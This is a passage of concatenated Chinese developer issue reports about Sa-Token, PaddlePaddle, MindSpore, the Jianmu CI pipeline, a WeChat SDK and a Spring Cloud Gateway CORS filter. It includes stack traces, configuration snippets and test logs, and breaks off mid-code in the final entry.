[ { ""nodeType"": ""ValueNode"", ""dataType"": 43, ""dims"": [ 5, 10, 10, 1 ], ""format"": ""NHWC"", ""refCount"": 0, ""offset"": 0 }, { ""nodeType"": ""ValueNode"", ""dataType"": 43, ""dims"": [ 1, 3, 3, 4 ], ""format"": ""KHWC"", ""refCount"": 0, ""offset"": 0, ""data"": [...] }, { ""nodeType"": ""CNode"", ""dataType"": 43, ""dims"": [ 5, 10, 10, 4 ], ""format"": ""NHWC"", ""refCount"": 0, ""offset"": 0 } ] }"
未成功初始化上下文,"写了一个demo，spring-boot集成webflux和sa-token以及redis-dao，将sa-token-spring-boot-starter从redis-dao中排除，解决了冲突问题，启动之后，调用StpUtil.isLogin()出现了新的问题：未成功初始化上下文，异常信息如下 以前没用过这个，不太熟，暂时找不到是什么原因，希望能得到指导，谢谢！   <code>: cn.dev33.satoken.exception.SaTokenException: 未成功初始化上下文 at cn.dev33.satoken.context.SaTokenContextForThreadLocalStorage.getBoxNotNull(SaTokenContextForThreadLocalStorage.java:53) ~[sa-token-core-1.16.0.jar:na] Suppressed: reactor.core.publisher.FluxOnAssembly$OnAssemblyException: Error has been observed at the following site(s): |_ checkpoint ? HTTP POST ""/user/login"" [ExceptionHandlingWebHandler] Stack trace: at cn.dev33.satoken.context.SaTokenContextForThreadLocalStorage.getBoxNotNull(SaTokenContextForThreadLocalStorage.java:53) ~[sa-token-core-1.16.0.jar:na] at cn.dev33.satoken.context.SaTokenContextForThreadLocalStorage.getStorage(SaTokenContextForThreadLocalStorage.java:82) ~[sa-token-core-1.16.0.jar:na] at cn.dev33.satoken.context.SaTokenContextForThreadLocal.getStorage(SaTokenContextForThreadLocal.java:26) ~[sa-token-core-1.16.0.jar:na] at cn.dev33.satoken.stp.StpLogic.isSwitch(StpLogic.java:1278) ~[sa-token-core-1.16.0.jar:na] at cn.dev33.satoken.stp.StpLogic.getLoginIdDefaultNull(StpLogic.java:487) ~[sa-token-core-1.16.0.jar:na] at cn.dev33.satoken.stp.StpLogic.isLogin(StpLogic.java:405) ~[sa-token-core-1.16.0.jar:na] at cn.dev33.satoken.stp.StpUtil.isLogin(StpUtil.java:179) ~[sa-token-core-1.16.0.jar:na] at com.example.satokentest.service.UserService.login(UserService.java:39) ~[classes/:na] at com.example.satokentest.controller.Controller.login(Controller.java:27) ~[classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_271] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_271] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_271] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_271] at org.springframework.web.reactive.result.method.InvocableHandlerMethod.lambda$invoke$0(InvocableHandlerMethod.java:146) ~[spring-webflux-5.3.5.jar:5.3.5] at reactor.core.publisher.MonoFlatMap$FlatMapMain.onNext(MonoFlatMap.java:125) [reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1815) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.MonoZip$ZipCoordinator.signal(MonoZip.java:251) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.MonoZip$ZipInner.onNext(MonoZip.java:336) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.MonoPeekTerminal$MonoTerminalPeekSubscriber.onNext(MonoPeekTerminal.java:180) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.FluxDefaultIfEmpty$DefaultIfEmptySubscriber.onNext(FluxDefaultIfEmpty.java:100) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.FluxSwitchIfEmpty$SwitchIfEmptySubscriber.onNext(FluxSwitchIfEmpty.java:73) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.FluxOnErrorResume$ResumeSubscriber.onNext(FluxOnErrorResume.java:79) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1815) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.MonoFlatMap$FlatMapMain.onNext(MonoFlatMap.java:151) [reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.FluxContextWrite$ContextWriteSubscriber.onNext(FluxContextWrite.java:107) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.FluxMapFuseable$MapFuseableConditionalSubscriber.onNext(FluxMapFuseable.java:295) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.FluxFilterFuseable$FilterFuseableConditionalSubscriber.onNext(FluxFilterFuseable.java:337) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.Operators$MonoSubscriber.complete(Operators.java:1815) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.MonoCollect$CollectSubscriber.onComplete(MonoCollect.java:159) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.FluxMap$MapSubscriber.onComplete(FluxMap.java:142) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.FluxPeek$PeekSubscriber.onComplete(FluxPeek.java:259) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.core.publisher.FluxMap$MapSubscriber.onComplete(FluxMap.java:142) ~[reactor-core-3.4.4.jar:3.4.4] at reactor.netty.channel.FluxReceive.onInboundComplete(FluxReceive.java:401) ~[reactor-netty-core-1.0.5.jar:1.0.5] at reactor.netty.channel.ChannelOperations.onInboundComplete(ChannelOperations.java:416) ~[reactor-netty-core-1.0.5.jar:1.0.5] at reactor.netty.http.server.HttpServerOperations.onInboundNext(HttpServerOperations.java:556) ~[reactor-netty-http-1.0.5.jar:1.0.5] at reactor.netty.channel.ChannelOperationsHandler.channelRead(ChannelOperationsHandler.java:94) ~[reactor-netty-core-1.0.5.jar:1.0.5] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at reactor.netty.http.server.HttpTrafficHandler.channelRead(HttpTrafficHandler.java:253) ~[reactor-netty-http-1.0.5.jar:1.0.5] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.CombinedChannelDuplexHandler$DelegatingChannelHandlerContext.fireChannelRead(CombinedChannelDuplexHandler.java:436) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:324) ~[netty-codec-4.1.60.Final.jar:4.1.60.Final] at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:296) ~[netty-codec-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.CombinedChannelDuplexHandler.channelRead(CombinedChannelDuplexHandler.java:251) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:719) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:655) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:581) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) ~[netty-transport-4.1.60.Final.jar:4.1.60.Final] at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) ~[netty-common-4.1.60.Final.jar:4.1.60.Final] at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) ~[netty-common-4.1.60.Final.jar:4.1.60.Final] at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) ~[netty-common-4.1.60.Final.jar:4.1.60.Final] at java.lang.Thread.run(Thread.java:748) ~[na:1.8.0_271]"
LSTM Max Pooling的文本分类网络效果不符合预期定位,"跑以上脚本，经过30轮后，测试集准确率达到86%左右，但使用厂内软件可以很容易达到88%，需要进一步定位问题的原因。可能的原因：1）参数配置有所差异，需要进一步细调。2）op实现有问题，但从testcase来看，应该问题不大。3）op组网部分的前向、后向可能存在问题。   <code>: import sys import numpy as np import paddle.v2 as paddle import paddle.v2.fluid as fluid def to_lodtensor(data, place): seq_lens = [len(seq) for seq in data] cur_len = 0 lod = [cur_len] for l in seq_lens: cur_len += l lod.append(cur_len) flattened_data = np.concatenate(data, axis=0).astype(""int64"") flattened_data = flattened_data.reshape([len(flattened_data), 1]) res = fluid.LoDTensor() res.set(flattened_data, place) res.set_lod([lod]) return res def load_vocab(filename): vocab = {} with open(filename) as f: wid = 0 for line in f: vocab[line.strip()] = wid wid += 1 return vocab word_dict = load_vocab(sys.argv[1]) word_dict[""&lt;unk&gt;""] = len(word_dict) #vocabulary size dict_dim = len(word_dict) # embedding dim emb_dim = 128 # hidden dim hid_dim = 128 # hidden dim2 hid_dim2 = 96 # class num class_dim = 2 data = fluid.layers.data( name=""words"", shape=[1], dtype=""int64"", lod_level=1) # label data label = fluid.layers.data(name=""label"", shape=[1], dtype=""int64"") # embedding emb = fluid.layers.embedding(input=data, size=[dict_dim, emb_dim], param_attr=fluid.ParamAttr(learning_rate=5.0)) gru_h, c = fluid.layers.dynamic_lstm(input=emb, size=hid_dim, is_reverse=False) gru_max = fluid.layers.sequence_pool(input=gru_h, pool_type='max', act='tanh') fc1 = fluid.layers.fc(input=gru_max, size=hid_dim2, act='tanh') prediction = fluid.layers.fc(input=fc1, size=class_dim, act='softmax') cost = fluid.layers.cross_entropy(input=prediction, label=label) avg_cost = fluid.layers.mean(x=cost) sgd_optimizer = fluid.optimizer.SGD(learning_rate=0.001) sgd_optimizer.minimize(avg_cost) accuracy = fluid.evaluator.Accuracy(input=prediction, label=label) inference_program = fluid.default_main_program().clone() with fluid.program_guard(inference_program): test_target = accuracy.metrics + accuracy.states inference_program = fluid.io.get_inference_program(test_target) BATCH_SIZE = 4 train_reader = paddle.batch( paddle.reader.shuffle( paddle.dataset.imdb.train(word_dict), buf_size=25000), batch_size=BATCH_SIZE) test_reader = paddle.batch( paddle.reader.shuffle( paddle.dataset.imdb.test(word_dict), buf_size=25000), batch_size=BATCH_SIZE) place = fluid.CPUPlace() def test(exe): accuracy.reset(exe) for batch_id, data in enumerate(test_reader()): input_seq = to_lodtensor(map(lambda x:x[0], data), place) y_data = np.array(map(lambda x: x[1], data)).astype(""int64"") y_data = y_data.reshape([-1, 1]) acc = exe.run(inference_program, feed={""words"": input_seq, ""label"": y_data}) return accuracy.eval(exe) exe = fluid.Executor(place) feeder = fluid.DataFeeder(feed_list=[data, label], place=place) exe.run(fluid.default_startup_program()) PASS_NUM = 30 for pass_id in xrange(PASS_NUM): accuracy.reset(exe) for data in train_reader(): cost_val, acc_val = exe.run(fluid.default_main_program(), feed=feeder.feed(data), fetch_list=[avg_cost, accuracy.metrics[0]]) pass_acc = accuracy.eval(exe) pass_test_acc = test(exe) print(""test_acc: %f"" % pass_test_acc)"
"流程定义中，若任务参数的value中若含有"".""，则该节点会无法执行",任务定义： 流程调用：   <code>: name: Image Build description: Image Build owner: jianmu source: https://gitee.com/jianmu_dev/jianmu-runner-image-build docs: https://docs.jianmu.dev/jianmu-runner-image-build ref: image_build version: v1.0 type: DOCKER inputParameters: - ref: docker_username name: dockerhub用户 type: SECRET value: ((dockerhub.username)) - ref: docker_password name: dockerhub用户密码 type: SECRET value: ((dockerhub.password)) - ref: image_name name: 镜像名称 type: STRING value: user/name - ref: image_tag name: 镜像tag type: STRING value: latest - ref: docker_file name: 指定Dockerfile文件 type: STRING value: Dockerfile - ref: docker_build_path name: 镜像构建目录 type: STRING value: . - ref: workspace name: 执行构建命令的目录 type: STRING value: /tmp - ref: cmd_pre name: 构建前执行命令 type: STRING value: ls - ref: cmd_pre name: 构建前执行命令 type: STRING value: date spec: image: 'jianmudev/jianmu-runner-image-build:v1.0' Create: type: image_build:v1.0 sources: - Git_Clone_Image targets: - End param: docker_username: ((dockerhub.username)) docker_password: ((dockerhub.password)) image_name: jianmudev/jianmu-web image_tag: v1.1 docker_file: Dockerfile docker_build_path: . workspace: jianmu-ui-image cmd_pre: cp -r ../jianmu-ui/dist .
【众智】【计算-AICPU开发】StridedSlice,"StridedSlice 1.1 功能介绍 提取张量的跨步切片 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/array_ops.py class StridedSlice(Primitive): （ 库上ascend版后3个输入变为属性，接口冲突故改名V2 ） def _StridedSliceGrad(op, grad):   <code>: REG_OP(StridedSlice) .INPUT(x, TensorType::BasicType()) .INPUT(begin, TensorType::IndexNumberType()) .INPUT(end, TensorType::IndexNumberType()) .INPUT(strides, TensorType::IndexNumberType()) .ATTR(begin_mask, Int, 0) .ATTR(end_mask, Int, 0) .ATTR(ellipsis_mask, Int, 0) .ATTR(new_axis_mask, Int, 0) .ATTR(shrink_axis_mask, Int, 0) .OUTPUT(y, TensorType::BasicType()) .OP_END_FACTORY_REG(StridedSlice)"
"[CT][MS][parallel]ps controlnet_adam_grouplr_o0, coincidence acc error",": /device gpu : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_parameter_server_controlnet_adam_grouplr_o0 cd /home/wys/code/MindSporeTest/parallel/parameter_server bash ../../share/parallel/tool/pytest_parallel_ps.sh -r /root/mindspore/hccl/hccl_8p.json -s 8 -b 0 -e 7 -n 3 -f test_parameter_server_controlflow_basic.py -t test_parameter_server_controlnet_adam_grouplr_o0 ps controlnet_adam_grouplr_o0, coincidence acc error case pass ^[[31m======================= ^[[31m^[[1m1 failed^[[0m, ^[[33m17 warnings^[[0m^[[31m in 31.25s^[[0m^[[31m ========================^[[0m 20738.5^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.625 20738.5 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.5 20738.5 20738.625 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.5 20738.625 20738.625 20738.625 20738.5 20738.5 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.5 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.625 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.625 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.625 20738.625 20738.625 20738.5^[[0m ^[[1m^[[31mE 20738.5 20738.625 20738.625 20738.625 20738.625 20738.5 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.5 20738.5 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.5 20738.625 20738.625 20738.625 20738.5 20738.5^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.625 20738.5 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.5 20738.5 20738.625 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.5 20738.625 20738.625 20738.625 20738.5 20738.5 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.5 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.5 20738.5 20738.625 20738.625 20738.625 20738.625 20738.5^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.5 20738.5 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.5 20738.625 20738.625 20738.625 20738.5^[[0m ^[[1m^[[31mE 20738.5 20738.625 20738.625 20738.625 20738.625 20738.5 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.5 20738.5 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.5 20738.625 20738.625 20738.625 20738.5 20738.5^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.625 20738.5 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.5 20738.5 20738.625 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.5 20738.625 20738.625 20738.625 20738.5 20738.5 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.5 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.5 20738.5 20738.625 20738.625 20738.625 20738.625 20738.5^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.5 20738.5 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.5 20738.625 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.625 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.5 20738.5 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.5 20738.625 20738.625 20738.625 20738.5 20738.5^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.625 20738.5 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.5 20738.5 20738.625 20738.625 20738.625 20738.625^[[0m ^[[1m^[[31mE 20738.5 20738.625 20738.625 20738.625 20738.5 20738.5 20738.625^[[0m ^[[1m^[[31mE 20738.625 20738.625 20738.625 20738.5 20738.625]^[[0m ^[[1m^[[31m../../../share/utils.py^[[0m:23: AssertionError   <code>: """""" TEST_SUMMARY: test operator control network in data parallel mode opt=""Adam"", lr=""group"", level=""O0"" """""" def test_parameter_server_controlnet_adam_grouplr_o0(): inputs_np = np.random.randn(32, 3, 224, 224).astype(np.float32) standalone_dataset = FakeData(size=32, batch_size=32, image_size=(3, 224, 224), num_classes=10) standalone_dataset0 = copy.deepcopy(standalone_dataset) fact = ControlNetFactory(opt=""Adam"", lr=""group"", level=""O0"", target='CPU', sparse=True, conv_target=False) fact.mindspore_standalone_impl(dataset=standalone_dataset, epoch=1) fact.mindspore_data_parallel_impl(dataset=standalone_dataset0, epoch=1) fact.checkpoint_cmp(Tensor(inputs_np))"
枚举内容生成到注释说明中,"建议：希望提供将数据字典内容生成到注释说明，生成后的SQL脚本中表现如下： 查看表数据时，根据注释可以方便的知道数据含义，而不需要看到数据字典表中查看。   <code>: user_status TINYINT UNSIGNED COMMENT '用户状态;1-&gt;正常,2-&gt;封禁'"
控制流用例子图下沉模式报错,"一·问题背景 用例test_010_if_inf_if.py::control_flow_if_in_if走子图下沉流程，在图模式D后端结果错误 二.问题定位分析 1.从打印结果看，输出与预期结果差1，怀疑param_b在func中的加一操作没有同步更新 2.打印各run graph的输入参数和参数地址，在out+=self.param_b对应的图中，图的输入地址不是param_b,而是一个新地址 3.打印各图创建output的地址，发现func对应的图中，param_b即是图的输入，又是图的输出，该图灭有直接使用input tensor作为输出地址，而是创建了新的tensor作为output地址，新的output tensor 作为if x &gt; self.param_a条件下内容对应的图的输入，在图中值更新，而param_b没有被同步更新，导致func图的输出再传给out+self.param_b时仍然是原来的值。 4. 抽象理解 param_b 是图A的输入， 创建param_b的副本copy_param_b作为图B的输入，在图B中对copy_param_b执行加1的操作，但是param_b仍然是原来的值，当再把param_b给图C使用时，就没有达到预期效果，因为它需要的是copy_param_b的值 在获取manager-&gt;node_users()[node]后，过滤非当前图的节点   <code>: class IfInIfNet1(nn.Cell): def __init__(self): super().__init__() self.param_a = Parameter(Tensor(5, mstype.int32), name='a') self.param_b = Parameter(Tensor(4, mstype.int32), name='b') def construct(self, x): if self.param_a &gt; self.param_b: out = self.func(x) else: out = self.func(self.param_a) out += self.param_b return out def func(self, x): x += 10 if x &gt; self.param_a: self.param_b += 1 x += self.param_a return x"
【MindSpore】【Ascend】【C类】【SEResNext】模型8p模型训练最后一轮ckpt精度不达标,"【SEResNext】模型8p模型训练最后一轮ckpt精度不达标 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: Please delete the backend not involved / 请删除不涉及的后端: /device ascend : --CANN 版本: (CANN 5.0.2.B058) --MindSpore 版本: mindspore 1.3.0 --Python 版本: Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 Steps to reproduce the issue / 重现步骤 执行8p训练命令bash ./scripts/run_distribution_train_ascend.sh [RANK_TABLE_FILE] imagenet bash ./scripts/run_distribution_train_ascend.sh hccl_8p_01234567_51.38.67.179.json imagenet RANK_TABLE_FILE=/data1/mwx989155/Mindspore/SE_ResNext50/hccl_8p_01234567_51.38.67.179.json Describe the expected behavior / 预期结果 训练标准精度是top1:79.35%, top5:94.64% 最后一轮是model ./train_parallel0/ckpt/train_senet_imagenet-120_1251.ckpt's accuracy is {'top_1_accuracy': 0.7857371794871795, 'top_5_accuracy': 0.9432692307692307} 超过0.5%范围了 Related log / screenshot / 日志 / 截图   <code>: used reduce precision to selected the kernel! model ./train_parallel0/ckpt/train_senet_imagenet-82_1251.ckpt's accuracy is {'top_1_accuracy': 0.7402844551282052, 'top_5_accuracy': 0.9221153846153847} model ./train_parallel0/ckpt/train_senet_imagenet-88_1251.ckpt's accuracy is {'top_1_accuracy': 0.7566105769230769, 'top_5_accuracy': 0.9295673076923077} model ./train_parallel0/ckpt/train_senet_imagenet-114_1251.ckpt's accuracy is {'top_1_accuracy': 0.7917668269230769, 'top_5_accuracy': 0.9452724358974359} model ./train_parallel0/ckpt/train_senet_imagenet-102_1251.ckpt's accuracy is {'top_1_accuracy': 0.7867988782051282, 'top_5_accuracy': 0.9438902243589744} model ./train_parallel0/ckpt/train_senet_imagenet-116_1251.ckpt's accuracy is {'top_1_accuracy': 0.7895633012820513, 'top_5_accuracy': 0.9442307692307692} model ./train_parallel0/ckpt/train_senet_imagenet-110_1251.ckpt's accuracy is {'top_1_accuracy': 0.7913461538461538, 'top_5_accuracy': 0.9456530448717949} model ./train_parallel0/ckpt/train_senet_imagenet-100_1251.ckpt's accuracy is {'top_1_accuracy': 0.7831530448717948, 'top_5_accuracy': 0.9427283653846154} model ./train_parallel0/ckpt/train_senet_imagenet-84_1251.ckpt's accuracy is {'top_1_accuracy': 0.7419871794871795, 'top_5_accuracy': 0.9234375} model ./train_parallel0/ckpt/train_senet_imagenet-86_1251.ckpt's accuracy is {'top_1_accuracy': 0.7462339743589743, 'top_5_accuracy': 0.9249399038461539} model ./train_parallel0/ckpt/train_senet_imagenet-94_1251.ckpt's accuracy is {'top_1_accuracy': 0.7712339743589743, 'top_5_accuracy': 0.936698717948718} model ./train_parallel0/ckpt/train_senet_imagenet-120_1251.ckpt's accuracy is {'top_1_accuracy': 0.7857371794871795, 'top_5_accuracy': 0.9432692307692307} model ./train_parallel0/ckpt/train_senet_imagenet-112_1251.ckpt's accuracy is {'top_1_accuracy': 0.791005608974359, 'top_5_accuracy': 0.9452524038461538} model ./train_parallel0/ckpt/train_senet_imagenet-118_1251.ckpt's accuracy is {'top_1_accuracy': 0.7893028846153847, 'top_5_accuracy': 0.9435296474358974} model ./train_parallel0/ckpt/train_senet_imagenet-92_1251.ckpt's accuracy is {'top_1_accuracy': 0.7619591346153847, 'top_5_accuracy': 0.9319511217948718} model ./train_parallel0/ckpt/train_senet_imagenet-108_1251.ckpt's accuracy is {'top_1_accuracy': 0.7909855769230769, 'top_5_accuracy': 0.9453325320512821} model ./train_parallel0/ckpt/train_senet_imagenet-98_1251.ckpt's accuracy is {'top_1_accuracy': 0.7795673076923076, 'top_5_accuracy': 0.938681891025641} model ./train_parallel0/ckpt/train_senet_imagenet-90_1251.ckpt's accuracy is {'top_1_accuracy': 0.7606770833333333, 'top_5_accuracy': 0.9307692307692308} model ./train_parallel0/ckpt/train_senet_imagenet-106_1251.ckpt's accuracy is {'top_1_accuracy': 0.7910857371794872, 'top_5_accuracy': 0.944551282051282} model ./train_parallel0/ckpt/train_senet_imagenet-104_1251.ckpt's accuracy is {'top_1_accuracy': 0.7883213141025641, 'top_5_accuracy': 0.9440304487179487} model ./train_parallel0/ckpt/train_senet_imagenet-96_1251.ckpt's accuracy is {'top_1_accuracy': 0.7748798076923077, 'top_5_accuracy': 0.9378205128205128}"
【MindSpore】【Ascend】【C类】【Auto-DeepLab】执行1p训练性能不达标，评估精度不达标,"一、问题描述： 1、执行1p训练，bash scripts/run_train.sh 0 /data/cityscapes/ 3 输出部分性能日志如下： 期望结果： 性能值标准：589.757 ms/step (8pcs)，与性能标准值下降不超过2% 2、使用8p训练最后一个ckpt文件评估精度输出精度为：eval mean IOU = 76.17%，标准为78.00%. 期望结果： 精度达标 二、软件版本: --CANN 版本: (CANN 5.0.2.B058) ----MindSpore 版本: mindspore 1.3.0 --Python 版本: Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04   <code>: epoch time: 1389448.463 ms, per step time: 3745.144 ms epoch: 2 step: 371, loss is 1.4509823 epoch time: 865577.022 ms, per step time: 2333.092 ms epoch: 3 step: 371, loss is 1.1665239 epoch time: 795360.085 ms, per step time: 2143.828 ms"
关于ILexicon.CJK_WORD类型的疑问,"hi，咨询个关于使用自定义词典的问题。 场景：简单的电商商品搜索场景，自定义一个品牌词典（品牌可能包含中英混合情况）：brand.lex。词典类型采用了CJK_WORD，词典具体为： 在验证时候，发现在ADictionary类中的652行输出了格式信息不准确，具体代码是会通过特定分隔符把词典每行进行分割，分割的数组长度小于4就会出现此问题： 仔细看了下这个格式需要变为以下才可以通过： 可以请问下这么设计是为了解决什么问题吗？或者说，我的场景，适合用哪种词典类型？   <code>: CJK_WORD 骆驼 花花公子 wd = line.split(""\\s*/\\s*""); if ( wd.length &lt; 4 ) { //format check System.out.println(""Word: \"""" + wd[0] + ""\"" format error. -ignored""); continue; } CJK_WORD 骆驼///null 花花公子///null"
只使用公众号配置，但是提示小程序的配置错误。,这是后台的配置，我只用了公众号的功能，但是运行时，提示 小程序（WxaConfigKit）的APPID获取不到是怎么回事？   <code>: dream: weixin: access-token-cache: office:access:token dev-mode: false url-patterns: /event/** app-id-key: appId wx-configs: - appId: ffffff appSecret: fffffffffffffffff token: fffffffffffffffffffffffff encodingAesKey: ffffffffffffffffffffffffffff messageEncrypt: true json-type: jackson java.lang.NullPointerException: null at com.jfinal.wxaapp.WxaConfigKit.getAppId(WxaConfigKit.java:82) at com.jfinal.wxaapp.WxaConfigKit.getWxaConfig(WxaConfigKit.java:88) at net.dreamlu.weixin.spring.MsgInterceptor.preHandle(MsgInterceptor.java:65)
跨域问题,"猜测 尝试解决 在网关内新增CorsFilter，代码如下 尝试后发现仍旧出现跨域问题。 疑惑 对分布式的框架和技术理解不是很到位，来社区提下Issue，寻求好的解决方案。 另外出现上述的情况，有没有可能是网关连接这些服务Cluster走的HTTP协议，由于服务提供方没有配置跨域处理，是不是也会造成网关处理失效？   <code>: 本地按照官方文档教程，前后端能够正常数据交互。 我这里跑后端，同事电脑跑前端，远程连接我的Gateway网关，出现跨域问题。 网关未做跨域处理,但是也挺奇怪的，本地跑项目，前后端端口是不一样的，却能够跑起来。 package com.ruoyi.gateway.filter; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.context.annotation.Bean; import org.springframework.core.Ordered; import org.springframework.http.HttpHeaders; import org.springframework.http.HttpMethod; import org.springframework.http.HttpStatus; import org.springframework.http.server.reactive.ServerHttpRequest; import org.springframework.http.server.reactive.ServerHttpResponse; import org.springframework.stereotype.Component; import org.springframework.web.cors.CorsConfiguration; import org.springframework.web.cors.reactive.CorsUtils; import org.springframework.web.cors.UrlBasedCorsConfigurationSource; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; @Component public class CorsFilter implements GlobalFilter, Ordered { @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { ServerHttpRequest request = 